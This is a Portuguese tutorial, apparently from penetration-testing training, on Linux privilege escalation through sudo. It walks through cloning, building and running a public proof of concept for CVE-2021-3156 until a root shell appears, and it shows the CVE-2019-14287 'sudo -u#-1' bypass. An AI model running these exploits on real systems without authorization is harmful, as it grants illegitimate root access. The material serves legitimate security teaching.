O programa `sudo` é utilizado em sistemas UNIX, como Linux e macOS, para executar processos com os direitos de outro usuário, geralmente para comandos que só administradores podem executar.
Ele adiciona uma camada de segurança, evitando danos ao sistema por usuários não autorizados. O arquivo `/etc/sudoers` define quais usuários ou grupos têm permissão para executar programas específicos e com quais privilégios.

```shell-session
cry0l1t3@nix02:~$ sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
[sudo] password for cry0l1t3:  **********

Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
Defaults        use_pty
root            ALL=(ALL:ALL) ALL
%admin          ALL=(ALL) ALL
%sudo           ALL=(ALL:ALL) ALL
cry0l1t3        ALL=(ALL) /usr/bin/id
@includedir     /etc/sudoers.d
```

Uma das vulnerabilidades mais recentes para `sudo` carrega o CVE-2021-3156 e é baseada em uma vulnerabilidade de estouro de buffer baseada em heap. Isso afetou as versões sudo:

- 1.8.31 - Ubuntu 20.04
- 1.8.27 - Debian 10
- 1.9.2 - Fedora 33
- e outros

Para descobrir a versão do sudo, o seguinte comando é suficiente:
```shell-session
cry0l1t3@nix02:~$ sudo -V | head -n1

Sudo version 1.8.31
```

O interessante sobre essa vulnerabilidade é que ela estava presente há mais de dez anos até ser descoberta. Há também uma [Prova de Conceito](https://github.com/blasty/CVE-2021-3156) pública que pode ser usada para isso. 
Podemos baixá-la para uma cópia do sistema de destino que criamos ou, se tivermos uma conexão com a internet, para o próprio sistema de destino.

```shell-session
cry0l1t3@nix02:~$ git clone https://github.com/blasty/CVE-2021-3156.git
cry0l1t3@nix02:~$ cd CVE-2021-3156
cry0l1t3@nix02:~$ make

rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
```

Ao executar o exploit, podemos ver uma lista que listará todas as versões disponíveis dos sistemas operacionais que podem ser afetados por esta vulnerabilidade.

```shell-session
cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

  usage: ./sudo-hax-me-a-sandwich <target>

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

  manual mode:
    ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>
```

Podemos descobrir com qual versão do sistema operacional estamos lidando usando o seguinte comando:

```shell-session
cry0l1t3@nix02:~$ cat /etc/lsb-release

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.1 LTS"
```

Em seguida, especificamos o respectivo ID para a versão do sistema operacional e executamos o exploit com nossa carga útil.

```shell-session
cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich 1

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
** pray for your rootshell.. **

# id

uid=0(root) gid=0(root) groups=0(root)
```

## Bypass de política do Sudo

Outra vulnerabilidade foi encontrada em 2019 que afetou todas as versões abaixo de `1.8.28`, o que permitiu que os privilégios aumentassem mesmo com um comando simples. Esta vulnerabilidade tem o [CVE-2019-14287](https://www.sudo.ws/security/advisories/minus_1_uid/) e requer apenas um único pré-requisito. Ela tinha que permitir que um usuário no arquivo `/etc/sudoers` executasse um comando específico.

```shell-session
cry0l1t3@nix02:~$ sudo -l
[sudo] password for cry0l1t3: **********

User cry0l1t3 may run the following commands on Penny:
    ALL=(ALL) /usr/bin/id
```

Na verdade, `Sudo` também permite que comandos com IDs de usuário específicos sejam executados, o que executa o comando com os privilégios do usuário carregando o ID especificado. O ID do usuário específico pode ser lido do arquivo `/etc/passwd`.

```shell-session
cry0l1t3@nix02:~$ cat /etc/passwd | grep cry0l1t3

cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash
```

Assim, o ID para o usuário `cry0l1t3`seria `1005`. Se um ID negativo ( `-1`) for inserido em `sudo`, isso resulta no processamento do ID `0`, que somente o `root` tem. Isso, portanto, levou ao shell root imediato.

```shell-session
cry0l1t3@nix02:~$ sudo -u#-1 id

root@nix02:/home/cry0l1t3# id

uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)
```

























































































